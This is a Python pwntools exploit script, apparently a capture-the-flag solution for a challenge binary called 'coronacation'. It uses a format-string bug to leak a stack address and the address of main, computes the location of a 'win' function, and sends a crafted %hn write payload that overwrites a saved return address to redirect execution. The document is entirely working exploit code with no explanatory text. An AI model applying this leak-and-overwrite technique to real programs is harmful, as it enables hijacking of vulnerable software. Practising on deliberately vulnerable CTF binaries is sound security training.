#!/usr/bin/env python3

from pwn import *

binary = ELF('coronacation')
p = process('./coronacation')
#p = remote('ctf.umbccd.io', 4300)

p.recvuntil('freaking out.\n')
p.sendline('1 %14$p %15$p ')
_ = p.recvuntil('plan.\n')

stack = int(_.split()[3],16)
main = int(_.split()[4],16) - 14
win = main - (binary.symbols['main'] - binary.symbols['win'])

print(hex(win))
print(hex(stack))

payload  = b'3       '
payload += b'%' + str((win & 0xFFFF) - 8).rjust(6,'0').encode() + b'x'
payload += b'%9$hn   '
payload += p64(stack - 8)

p.sendline(payload)
#p.stream()
_ = p.recvline()
import re
print(re.sub(b'000+',b' ...[zeros removed]... ',_,1))
